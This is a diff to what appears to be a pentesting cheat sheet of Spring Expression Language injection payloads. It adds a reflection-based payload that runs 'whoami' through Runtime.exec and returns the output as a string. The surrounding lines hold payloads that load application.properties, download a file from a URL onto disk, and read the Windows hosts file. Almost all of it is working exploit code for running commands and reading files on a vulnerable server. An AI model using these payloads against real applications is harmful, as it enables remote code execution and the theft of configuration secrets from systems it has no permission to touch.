@@ -25,9 +25,13 @@ T(org.springframework.core.io.support.PropertiesLoaderUtils).loadAllProperties("
 "".getClass().forName("org.springframework.core.io.support.PropertiesLoaderUtils").getMethod("loadAllProperties","".getClass()).invoke("","application.properties").toString()
 ```
 
-## Reading command output
+## Reading command output (bytes)
 ```java
 T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
+```
+## Reading command output (strings)
+```java
+"".getClass().forName("java.lang.String").getConstructor("".getClass().forName("[B")).newInstance("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami").getInputStream().readAllBytes())
 ```
 
 ## Get current path
@@ -57,7 +61,6 @@ T(java.nio.file.Files).copy(new java.net.URL("http://127.0.0.1:8888/test.txt").o
 
 T(java.nio.file.Files).readAllLines("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
 ```
-
 ## Read Files (Bytes)
 ```java
 // this one may not work beacuse of difference of java.nio.file.Paths.Get arguments from java to java
